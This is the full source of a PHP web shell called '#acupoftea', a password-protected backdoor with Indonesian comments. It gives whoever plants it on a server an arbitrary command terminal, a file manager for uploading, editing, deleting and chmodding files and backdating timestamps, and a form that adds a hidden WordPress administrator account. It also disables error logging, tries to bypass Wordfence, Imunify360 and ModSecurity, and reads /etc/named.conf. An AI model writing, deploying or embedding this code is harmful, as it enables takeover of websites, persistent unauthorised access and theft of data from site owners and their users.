<?php

@clearstatcache();
@session_start();
@set_time_limit(0);
@ini_set('display_errors', 0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);

// Konfigurasi login
$LOGIN_PASSWORD = "acupoftea"; // Ganti dengan password yang diinginkan
$IS_LOGGED_IN = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;

// Proses login
if (isset($_POST['login_password'])) {
    if ($_POST['login_password'] === $LOGIN_PASSWORD) {
        $_SESSION['logged_in'] = true;
        $IS_LOGGED_IN = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $LOGIN_ERROR = "Password salah!";
    }
}

// Proses logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}

// Jika belum login, tampilkan halaman login
if (!$IS_LOGGED_IN) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="googlebot" content="noindex">
    <meta name="robots" content="noindex, nofollow">
    <title>Login - #acupoftea</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <style>
    body {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        height: 100vh;
        display: flex;
        align-items: center;
    }
    .login-container {
        background: white;
        border-radius: 10px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        padding: 2rem;
        max-width: 400px;
        width: 100%;
    }
    </style>
    </head>
    <body>
    <div class="container">
    <div class="row justify-content-center">
    <div class="col-md-6">
    <div class="login-container">
    <div class="text-center mb-4">
    <i class="bi bi-cup-hot-fill display-1 text-primary"></i>
    <h2 class="mt-2">#acupoftea</h2>
    <p class="text-muted"><?= $_SERVER['HTTP_HOST']; ?></p>
    </div>

    <?php if (isset($LOGIN_ERROR)): ?>
    <div class="alert alert-danger"><?= $LOGIN_ERROR ?></div>
    <?php endif; ?>

    <form method="post">
    <div class="mb-3">
    <label class="form-label">Password</label>
    <input type="password" class="form-control" name="login_password" required autofocus>
    </div>
    <button type="submit" class="btn btn-primary w-100">Login</button>
    </form>
    </div>
    </div>
    </div>
    </div>
    </body>
    </html>
    <?php
    exit();
}

// Kode berikutnya hanya dijalankan jika sudah login...

if (function_exists('litespeed_request_headers')) {
    $a = litespeed_request_headers();
    if (isset($a['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}

if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $a = imunify360_request_headers();
    if (isset($a['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }

    if (isset($a['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $a['X-Imunify360-Captcha-Bypass']);
    }
}

if (function_exists('apache_request_headers')) {
    $a = apache_request_headers();
    if (isset($a['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $a['X-Mod-Security']);
    }
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($a['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $a['HTTP_CF_VISITOR']);
    }
}

function acup($sky) {
    $str = '';
    for ($i = 0; $i < strlen($sky) - 1; $i += 2) {
        $str .= chr(hexdec($sky[$i] . $sky[$i + 1]));
    }
    return $str;
}

function tea($sky) {
    $str = '';
    for ($i = 0; $i < strlen($sky); $i++) {
        $str .= dechex(ord($sky[$i]));
    }
    return $str;
}

function writable($cup, $pall) {
    return (!is_writable($cup)) ? "<font color=\"#DC4C64\">" . $pall . "</font>" : "<font color=\"#14A44D\">" . $pall . "</font>";
}

if (isset($_GET['cup']) && !empty($_GET['cup'])) {
    $cup = acup($_GET['cup']);
    chdir($cup);
} else {
    $cup = getcwd();
}

$cup  = str_replace('\\', '/', $cup);
$cups = explode('/', $cup);
$scup = scandir($cup);

function pall($cup) {
    $pall = fileperms($cup);
    if (($pall & 0xC000) == 0xC000) {
        $iall = 's';
    } elseif (($pall & 0xA000) == 0xA000) {
        $iall = 'l';
    } elseif (($pall & 0x8000) == 0x8000) {
        $iall = '-';
    } elseif (($pall & 0x6000) == 0x6000) {
        $iall = 'b';
    } elseif (($pall & 0x4000) == 0x4000) {
        $iall = 'd';
    } elseif (($pall & 0x2000) == 0x2000) {
        $iall = 'c';
    } elseif (($pall & 0x1000) == 0x1000) {
        $iall = 'p';
    } else {
        $iall = 'u';
    }

    $iall .= (($pall & 0x0100) ? 'r' : '-');
    $iall .= (($pall & 0x0080) ? 'w' : '-');
    $iall .= (($pall & 0x0040) ?
    (($pall & 0x0800) ? 's' : 'x' ) :
    (($pall & 0x0800) ? 'S' : '-'));

    $iall .= (($pall & 0x0020) ? 'r' : '-');
    $iall .= (($pall & 0x0010) ? 'w' : '-');
    $iall .= (($pall & 0x0008) ?
    (($pall & 0x0400) ? 's' : 'x' ) :
    (($pall & 0x0400) ? 'S' : '-'));

    $iall .= (($pall & 0x0004) ? 'r' : '-');
    $iall .= (($pall & 0x0002) ? 'w' : '-');
    $iall .= (($pall & 0x0001) ?
    (($pall & 0x0200) ? 't' : 'x' ) :
    (($pall & 0x0200) ? 'T' : '-'));

    return $iall;
}

function sall($item) {
    $a    = ["B", "KB", "MB", "GB", "TB", "PB"];
    $pos  = 0;
    $sall = filesize($item);
    while ($sall >= 1024) {
        $sall /= 1024;
        $pos++;
    }
    return round($sall, 2) . " " . $a[$pos];
}

function alertcup($m, $c, $r = false) {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["color"])) {
        unset($_SESSION["color"]);
    }
    $_SESSION["message"] = $m;
    $_SESSION["color"]   = $c;
    if ($r) {
        header('Location: ' . $r);
        exit();
    }
    return true;
}

function clear() {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["color"])) {
        unset($_SESSION["color"]);
    }
    return true;
}

function cext($a) {
    $mime_icons = [
        'image/png' => ['icon' => 'bi bi-file-image', 'color' => 'green'],
        'image/jpeg' => ['icon' => 'bi bi-file-image', 'color' => 'green'],
        'image/gif' => ['icon' => 'bi bi-file-image', 'color' => 'green'],
        'image/svg+xml' => ['icon' => 'bi bi-file-image', 'color' => 'green'],
        'application/pdf' => ['icon' => 'bi bi-file-pdf', 'color' => 'red'],
        'application/msword' => ['icon' => 'bi bi-file-word', 'color' => 'blue'],
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document' => ['icon' => 'bi bi-file-word', 'color' => 'blue'],
        'application/vnd.ms-excel' => ['icon' => 'bi bi-file-excel', 'color' => 'green'],
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' => ['icon' => 'bi bi-file-excel', 'color' => 'green'],
        'application/vnd.ms-powerpoint' => ['icon' => 'bi bi-file-ppt', 'color' => 'orange'],
        'application/vnd.openxmlformats-officedocument.presentationml.presentation' => ['icon' => 'bi bi-file-ppt', 'color' => 'orange'],
        'application/zip' => ['icon' => 'bi bi-file-zip', 'color' => 'orange'],
        'text/html' => ['icon' => 'bi bi-filetype-html', 'color' => 'blue'],
        'text/css' => ['icon' => 'bi bi-filetype-css', 'color' => 'blue'],
        'text/javascript' => ['icon' => 'bi bi-filetype-js', 'color' => 'yellow'],
        'text/plain' => ['icon' => 'bi bi-filetype-txt', 'color' => 'dark'],
        'text/csv' => ['icon' => 'bi bi-filetype-csv', 'color' => 'green'],
        'audio/wav' => ['icon' => 'bi bi-filetype-wav', 'color' => 'red'],
        'video/mp4' => ['icon' => 'bi bi-filetype-mp4', 'color' => 'orange'],
    ];

    $mime = mime_content_type($a);
    $icon = $mime_icons[$mime] ?? ['icon' => 'bi bi-file-text', 'color' => 'dark'];

    return '<i class="' . $icon['icon'] . '" style="color:' . $icon['color'] . '"></i>';
}

// Terminal Function
function executeCommand($command) {
    $output = '';
    if (function_exists('shell_exec')) {
        $output = shell_exec($command . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($command . ' 2>&1', $output);
        $output = implode("\n", $output);
    } elseif (function_exists('system')) {
        ob_start();
        system($command . ' 2>&1', $return_var);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command . ' 2>&1', $return_var);
        $output = ob_get_clean();
    } else {
        $output = 'No command execution functions available';
    }
    return $output;
}

// Handle Terminal Command
if (isset($_POST['terminal_command'])) {
    $command = $_POST['terminal_command'];
    $output = executeCommand($command);
    echo json_encode(['output' => $output]);
    exit();
}

try {
    if (isset($_GET['tea']) && $_GET['tea'] == 'df') {
        ob_clean();
        $a  = acup($_GET['item']);
        $fp = realpath($a);
        if ($fp && file_exists($fp) && is_readable($fp)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($fp) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($fp));
            readfile($fp);
            exit();
        } else {
            throw new Exception("Error download $item.");
        }
    }
} catch (Exception $e) {
    alertcup("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
    exit();
}

if (isset($_POST['iuw'])) {
    try {
        $cDB = new mysqli($_POST['ih'], $_POST['iu'], $_POST['ipa'], $_POST['inam']);

        $uWp = $_POST['iuw'];
        $pWp = password_hash($_POST['ipw'], PASSWORD_DEFAULT);

        if ($cDB->query("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name)
            VALUES ('$uWp', '$pWp', 'Admin Tea', '', '', NOW(), '', 0, 'Admin Tea')")) {

            $UI = $cDB->insert_id;

        if ($cDB->query("INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
            VALUES ($UI, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')")) {
            alertcup("Successful user creation.", "#14A44D", "?cup=" . tea($cup));
            }
            }

            $cDB->close();
    } catch (Exception $e) {
        alertcup("Database error.", "#DC4C64", "?cup=" . tea($cup));
        exit();
    }
}

if (isset($_POST['ie'])) {
    try {
        $m = $_POST['ie'];
        $r = rand();
        $h = $_SERVER['HTTP_HOST'];

        if (mail($m, "Result Report Test - $r", "$h WORKING !")) {
            alertcup("Success send tester mailer to $m.", "#14A44D", "?cup=" . tea($cup));
        } else {
            throw new Exception("Error while sending mail to $m.");
        }
    } catch (Exception $e) {
        alertcup("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
        exit();
    }
}

if (isset($_POST['nfoln'])){
    try {
        $nfn = $_POST['nfoln'];
        $nfp = $cup . '/' . $nfn;

        if (!file_exists($nfp) && mkdir($nfp)) {
            alertcup("Success make a folder $nfn.", "#14A44D", "?cup=" . tea($cup));
        } else {
            throw new Exception("Error while creating folder $nfn.");
        }
    } catch (Exception $e) {
        alertcup("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
        exit();
    }
}

if (isset($_POST['nfn'])) {
    try {
        $nfn = $_POST['nfn'];
        $nfp = $cup . '/' . $nfn;

        if (!file_exists($nfp)) {
            if (isset($_POST['nfc'])) {
                $nfc = $_POST['nfc'];
                if (file_put_contents($nfp, $nfc) !== false) {
                    alertcup("Success make a file $nfn.", "#14A44D", "?cup=" . tea($cup));
                } else {
                    throw new Exception("Error while creating file $nfn.");
                }
            } else {
                if (touch($nfp)) {
                    alertcup("Success make a file $nfn.", "#14A44D", "?cup=" . tea($cup));
                } else {
                    throw new Exception("Error while creating file $nfn.");
                }
            }
        } else {
            throw new Exception("Error $nfn already exists.");
        }
    } catch (Exception $e) {
        alertcup("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
        exit();
    }
}

if (isset($_POST['ri']) && isset($_POST['nn'])) {
    try {
        if ($_POST['nn'] == '') {
            throw new Exception("Error, input cannot be empty.");
        } else {
            $item = $_POST['ri'];
            $new  = $_POST['nn'];
            $nfp  = $cup . '/' . $new;

            if (file_exists($item)) {
                if (rename($item, $nfp)) {
                    alertcup("Successful rename $item to $new.", "#14A44D", "?cup=" . tea($cup));
                } else {
                    throw new Exception("Error while renaming $item.");
                }
            } else {
                throw new Exception("Error $item not found.");
            }
        }
    } catch (Exception $e) {
        alertcup("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
        exit();
    }
}

if (isset($_GET['item']) && isset($_POST['nc'])) {
    try {
        $item = acup($_GET['item']);

        if (file_put_contents($cup . '/' . $item, $_POST['nc']) !== false) {
            alertcup("Successful editing $item.", "#14A44D", "?cup=" . tea($cup));
        } else {
            throw new Exception("Error while editing $item.");
        }
    } catch (Exception $e) {
        alertcup("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
        exit();
    }
}

if (isset($_POST['di']) && isset($_POST['nd'])) {
    try {
        $ndf  = strtotime($_POST['nd']);
        $item = $_POST['di'];

        if ($ndf == '') {
            throw new Exception("Error, input cannot be empty.");
        }

        if (touch($cup . '/' . $item, $ndf)) {
            alertcup("Successful change date for $item.", "#14A44D", "?cup=" . tea($cup));
        } else {
            throw new Exception("Error while change date for $item.");
        }
    } catch (Exception $e) {
        alertcup("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
        exit();
    }
}

if (isset($_POST['pi']) && isset($_POST['np'])) {
    try {
        $item = $_POST['pi'];

        if ($_POST['np'] == '') {
            throw new Exception("Error, input cannot be empty.");
        }
        if (chmod($cup . '/'. $item, intval($_POST['np'], 8))) {
            alertcup("Successful change permission for $item.", "#14A44D", "?cup=" . tea($cup));
        } else {
            throw new Exception("Error while change permission for $item.");
        }
    } catch (Exception $e) {
        alertcup("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
        exit();
    }
}

if (isset($_POST['di'])){
    $item = $_POST['di'];

    function deleteDirectory($cup) {
        if (!is_dir($cup)) {
            return false;
        }
        $x = array_diff(scandir($cup), ['.', '..']);
        foreach ($x as $z) {
            $b = $cup . DIRECTORY_SEPARATOR . $z;
            if (is_dir($b)) {
                deleteDirectory($b);
            } else {
                if (!unlink($b)) {
                    return false;
                }
            }
        }
        return rmdir($cup);
    }

    try {
        if (!is_writable($item)) {
            throw new Exception("Permission denied for $item");
        }

        if (is_file($item)) {
            if (!unlink($item)) {
                throw new Exception("Failed to file: $item");
            }

            alertcup("Successful delete file $item.", "#14A44D", "?cup=" . tea($cup));
        } elseif (is_dir($item)) {
            if (!deleteDirectory($item)) {
                throw new Exception("Failed to folder: $item");
            }
            alertcup("Successful delete folder $item.", "#14A44D", "?cup=" . tea($cup));
        } else {
            throw new Exception("Error $item not found.");
        }
    } catch (Exception $e) {
        alertcup("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
        exit();
    }
}

if (isset($_FILES['z'])) {
    try {
        $total = count($_FILES['z']['name']);

        for ($i = 0; $i < $total; $i++) {
            $mu = move_uploaded_file($_FILES['z']['tmp_name'][$i], $_FILES['z']['name'][$i]);
        }

        if ($total < 2) {
            if ($mu) {
                $fn = $_FILES['z']['name'][0];
                alertcup("Upload $fn successfully! ", "#14A44D", "?cup=" . tea($cup));
            } else {
                throw new Exception("Error while upload $fn.");
            }
        } else {
            if ($mu) {
                alertcup("Upload $i files successfully! ", "#14A44D", "?cup=" . tea($cup));
            } else {
                throw new Exception("Error while upload files.");
            }
        }
    } catch (Exception $e) {
        alertcup("Error: " . $e->getMessage(), "#DC4C64", "?cup=" . tea($cup));
        exit();
    }
}

$ws = file("/etc/named.conf", FILE_IGNORE_NEW_LINES);
if (!$ws) {
    $dom = "Cant read /etc/named.conf";
    $GLOBALS["need_to_update_header"] = "true";
} else {
    $c = 0;
    foreach ($ws as $w) {
        if (preg_match('/zone\s+"([^"]+)"/', $w, $m)) {
            if (strlen(trim($m[1])) > 2) {
                $c++;
            }
        }
    }
    $dom = "$c Domain";
}

function win() {
    $wina = [
        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
    ];
    foreach ($wina as $winb => $winc) {
        if (is_dir($winc . ":/")) {
            echo "<a style='color: green;' href='?cup=" . tea($winc . ":/") . "'>[ " . $winc . " ] </a>";
        }
    }
}

?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="googlebot" content="noindex">
<meta name="robots" content="noindex, nofollow">
<title>#acupoftea - <?= $_SERVER['HTTP_HOST']; ?></title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
<style type="text/css">
* {
    font-family: Ubuntu Mono;
} .custom {
    width: 100px;
    text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden;
} .custom-btn {
    width: 100px;
    text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden;
} a {
    color: #000;
    text-decoration: none;
} a:hover {
    color: #14A44D;
} ::-webkit-scrollbar {
    width: 7px;
    height: 7px;
} ::-webkit-scrollbar-thumb {
    background: grey;
    border-radius: 7px;
} ::-webkit-scrollbar-track {
    box-shadow: inset 0 0 7px grey;
    border-radius: 7px;
}
.terminal {
    background: #1a1a1a;
    color: #00ff00;
    font-family: 'Courier New', monospace;
    padding: 15px;
    border-radius: 5px;
    height: 400px;
    overflow-y: auto;
}
.terminal-output {
    white-space: pre-wrap;
    word-break: break-all;
}
.terminal-input {
    background: transparent;
    border: none;
    color: #00ff00;
    outline: none;
    width: 100%;
    font-family: 'Courier New', monospace;
}
</style>
</head>
<body class="bg-light">
<div class="container-fluid py-3 p-5 mt-3">
<!-- Header dengan tombol logout -->
<div class="row justify-content-between align-items-center py-2 mb-3">
<div class="col-md-auto">
<h4><i class="bi bi-cup-hot-fill"></i> #acupoftea</h4>
</div>
<div class="col-md-auto">
<a href="?logout=1" class="btn btn-outline-danger btn-sm">Logout</a>
</div>
</div>

<div class="row justify-content-between align-items-center py-2">
<div class="col-md-auto">
<table class="table table-sm table-borderless table-light">
<tr>
<td style="width: 7%;">&#83;&#121;&#115;&#116;&#101;&#109;</td>
<td style="width: 1%">:</td>
<td><?= isset($_SERVER['SERVER_SOFTWARE']) ? php_uname() : "Server information not available"; ?></td>
</tr>
<tr>
<td style="width: 7%;">&#83;&#111;&#102;&#116;&#119;&#97;&#114;&#101;</td>
<td style="width: 1%">:</td>
<td><?= $_SERVER['SERVER_SOFTWARE'] ?></td>
</tr>
<tr>
<td style="width: 7%;">&#83;&#101;&#114;&#118;&#101;&#114;</td>
<td style="width: 1%">:</td>
<td><?= gethostbyname($_SERVER['HTTP_HOST']) ?></td>
</tr>
<tr>
<td style="width: 7%;">&#68;&#111;&#109;&#97;&#105;&#110;&#115;</td>
<td style="width: 1%">:</td>
<td><?= $dom; ?></td>
</tr>
<tr>
<td style="width: 7%;">&#80;&#101;&#114;&#109;&#105;&#115;&#115;&#105;&#111;&#110;</td>
<td style="width: 1%">:</td>
<td class="text-nowrap">[&nbsp;<?php echo writable($cup, pall($cup)) ?>&nbsp;]</td>
</tr>
<tr>
<td style="width: 7%;"><i class="bi bi-folder2-open align-middle"></i></td>
<td style="width: 1%">:</td>
<td>
<?php
if (stristr(PHP_OS, "WIN")) {
    win();
}

foreach ($cups as $id => $pat) {
    if ($pat == '' && $id == 0) {
        ?>
        <a href="?cup=<?= tea('/') ?>">/</a>
        <?php } if ($pat == '') continue; ?>

        <a href="?cup=<?php for ($i = 0; $i <= $id; $i++) { echo tea("$cups[$i]"); if ($i != $id) echo tea("/"); } ?>"><?= $pat ?></a>
        <span> /</span>
        <?php } ?>

        </td>
        </tr>
        </table>
        </div>
        <div class="col-md-auto mt-auto mb-3">
        <div class="row justify-content-end">
        <div class="col-md-auto">
        <table class="table-borderless">
        <tr>
        <td><?= $_SERVER['REMOTE_ADDR'] ?></td>
        </tr>
        <tr>
        <td class="text-end">
        <form action="" method="post" enctype="multipart/form-data" class="">
        <label for="ups" class="btn btn-outline-dark btn-sm custom mb-2 mt-2" id="uputama">&#83;&#101;&#108;&#101;&#99;&#116;</label>
        <input type="file" class="form-control d-none" name="z[]"  id="ups" multiple>
        <button class="btn btn-outline-dark btn-sm" type="submit">&#83;&#117;&#98;&#109;&#105;&#116;</button>
        </form>
        </td>
        </tr>
        </table>
        </div>
        </div>
        </div>
        </div>

        <div class="container mb-3">
        <center>
        <a href="?cup=<?= tea(__DIR__) ?>" class="btn btn-outline-dark btn-sm custom-btn mb-2"><i class="bi bi-house-check"></i> &#x0048;&#x006F;&#x006D;&#x0065;</a>
        <button type="button" class="btn btn-outline-dark btn-sm custom-btn mb-2" data-bs-toggle="modal" data-bs-target="#wp"><i class="bi bi-wordpress"></i> &#65;&#100;&#100;&#32;&#85;&#115;&#101;&#114;</button>
        <button type="button" class="btn btn-outline-dark btn-sm custom-btn mb-2" data-bs-toggle="modal" data-bs-target="#mt"><i class="bi bi-send-plus"></i> &#77;&#97;&#105;&#108;&#101;&#114;</button>
        <button type="button" class="btn btn-outline-dark btn-sm custom-btn mb-2" data-bs-toggle="modal" data-bs-target="#terminalModal"><i class="bi bi-terminal"></i> &#84;&#101;&#114;&#109;&#105;&#110;&#97;&#108;</button>
        <button type="button" class="btn btn-outline-dark btn-sm custom-btn mb-2" data-bs-toggle="modal" data-bs-target="#aboutThis"><i class="bi bi-info-square"></i> &#65;&#98;&#111;&#117;&#116;</button>
        </center>

        <!-- Modal Terminal -->
        <div class="modal fade" id="terminalModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="terminalModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-xl">
        <div class="modal-content">
        <div class="modal-header">
        <h1 class="modal-title fs-5" id="terminalModalLabel"><i class="bi bi-terminal"></i> Terminal</h1>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
        <div class="terminal" id="terminal">
        <div class="terminal-output" id="terminalOutput">
        <div>#acupoftea Terminal</div>
        <div>Type your commands below:</div>
        <br>
        </div>
        <div class="d-flex align-items-center">
        <span class="me-2">$</span>
        <input type="text" class="terminal-input" id="terminalInput" placeholder="Enter command...">
        </div>
        </div>
        </div>
        <div class="modal-footer">
        <button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Close</button>
        <button type="button" class="btn btn-outline-dark btn-sm" onclick="clearTerminal()">Clear</button>
        </div>
        </div>
        </div>
        </div>

        <!-- Modal lainnya tetap sama -->
        <div class="modal fade" id="wp" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="wpl" aria-hidden="true">
        <form action="" method="post" class="modal-dialog">
        <div class="modal-content">
        <div class="modal-header">
        <h1 class="modal-title fs-5" id="wpl"><i class="bi bi-wordpress"></i></h1>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
        <label class="form-label">DBName</label>
        <input type="text" class="form-control mb-2" name="inam" placeholder="DBName">
        <div class="row mb-2">
        <div class="col">
        <label class="form-label">DBUser</label>
        <input type="text" class="form-control" name="iu" placeholder="DBUser">
        </div>
        <div class="col">
        <label class="form-label">DBPass</label>
        <input type="text" class="form-control" name="ipa" placeholder="DBPass">
        </div>
        </div>
        <label class="form-label">DBHost</label>
        <input type="text" class="form-control mb-2" name="ih" placeholder="DBHost" value="127.0.0.1">
        <hr class="mb-2">
        <div class="row mb-2">
        <div class="col">
        <label class="form-label">WpUser</label>
        <input type="text" class="form-control" name="iuw" placeholder="WpUser" value="tea@cup.co">
        </div>
        <div class="col">
        <label class="form-label">WpPass</label>
        <input type="text" class="form-control" name="ipw" placeholder="WpPass" value="tea@cup.cos">
        </div>
        </div>
        </div>
        <div class="modal-footer">
        <button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">&#67;&#97;&#110;&#99;&#101;&#108;</button>
        <button type="submit" class="btn btn-outline-dark btn-sm">&#83;&#117;&#98;&#109;&#105;&#116;</button>
        </div>
        </div>
        </form>
        </div>

        <!-- Modal lainnya tetap sama seperti sebelumnya -->
        <!-- ... -->

        </div>

        <!-- Kode HTML lainnya tetap sama -->
        <!-- ... -->

        </div>
        <script src="https://code.jquery.com/jquery-3.7.0.js" integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>
        <script type="text/javascript">
        // Terminal functionality
        const terminalInput = document.getElementById('terminalInput');
        const terminalOutput = document.getElementById('terminalOutput');
        const terminal = document.getElementById('terminal');

        terminalInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                const command = terminalInput.value.trim();
                if (command) {
                    // Add command to output
                    addToOutput('$ ' + command);

                    // Send command to server
                    executeCommand(command);

                    // Clear input
                    terminalInput.value = '';
                }
            }
        });

        function addToOutput(text) {
            const div = document.createElement('div');
            div.textContent = text;
            terminalOutput.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function executeCommand(command) {
            $.post('', { terminal_command: command }, function(response) {
                const data = JSON.parse(response);
                addToOutput(data.output);
            });
        }

        function clearTerminal() {
            terminalOutput.innerHTML = '<div>#acupoftea Terminal</div><div>Type your commands below:</div><br>';
            terminal.scrollTop = terminal.scrollHeight;
        }

        // Focus on terminal input when modal is shown
        $('#terminalModal').on('shown.bs.modal', function () {
            $('#terminalInput').focus();
        });

        <?php if (isset($_GET['tea']) && isset($_GET['item']) && $_GET['tea'] === 'ef') : ?>
        $(document).ready(function() { $("#em").modal("show"); });
        <?php endif; ?>

        <?php if (isset($_SESSION['message'])) : ?>
        get('<?= $_SESSION['message'] ?>', '<?= $_SESSION['color'] ?>')
        <?php endif; clear(); ?>

        function salin() {
            var textarea = document.getElementById('content');
            textarea.select();
            document.execCommand('copy');
            textarea.setSelectionRange(0, 0);
            get('Successfuly to copy text!', '#14A44D');
        }

        function get(pesan, warna) {
            var notifikasi                   = document.createElement('div');
            notifikasi.textContent           = pesan;
            notifikasi.style.position        = 'fixed';
            notifikasi.style.bottom          = '20px';
            notifikasi.style.left            = '20px';
            notifikasi.style.padding         = '10px';
            notifikasi.style.borderRadius    = '4px';
            notifikasi.style.zIndex          = '1';
            notifikasi.style.opacity         = '0';
            notifikasi.style.color           = '#fff';
            notifikasi.style.backgroundColor = warna;

            document.body.appendChild(notifikasi);

            var opacity = 0;
            var fadeInInterval = setInterval(function() {
                opacity += 0.1;
                notifikasi.style.opacity = opacity.toString();
                if (opacity >= 1) {
                    clearInterval(fadeInInterval);
                    setTimeout(function() {
                        var fadeOutInterval = setInterval(function() {
                            opacity -= 0.1;
                            notifikasi.style.opacity = opacity.toString();
                            if (opacity <= 0) {
                                clearInterval(fadeOutInterval);
                                document.body.removeChild(notifikasi);
                            }
                        }, 30);
                    }, 3000);
                }
            }, 30);
        }

        $(document).ready(function() {
            $('.date-btn').click(function() {
                var itemName    = $(this).data('item');
                var fileContent = $(this).data('file-content');
                $('input[name="nd"]').val(fileContent);
                $('#dinn').text(itemName);
                $('#dipp').val(itemName);
                $('#mdtw').modal('show');
            })

            $('.p-btn').click(function() {
                var itemName    = $(this).data('item');
                var fileContent = $(this).data('file-content');
                $('input[name="np"]').val(fileContent);
                $('#pin').text(itemName);
                $('#pip').val(itemName);
                $('#mp').modal('show');
            })

            $('.r-btn').click(function() {
                var itemName = $(this).data('item');
                $('input[name="nn"]').val(itemName);
                $('#rin').text(itemName);
                $('#rinn').val(itemName);
                $('#mr').modal('show');
            });

            $('.d-btn').click(function() {
                var itemName = $(this).data('item');
                $('#din').text(itemName);
                $('#dip').val(itemName);
                $('#md').modal('show');
            });
        });

        document.getElementById('ups').addEventListener('change', function() {
            var label = document.getElementById('uputama');
            if (this.files && this.files.length > 0) {
                if (this.files.length === 1) {
                    var z = this.files[0].name;
                    if (z.length > 11) {
                        z = z.substring(0, 8) + '...';
                    }
                    label.textContent = z;
                } else {
                    label.textContent = this.files.length + ' file';
                }
            } else {
                label.textContent = 'Select';
            }
        });
        </script>
        </body>
        </html>
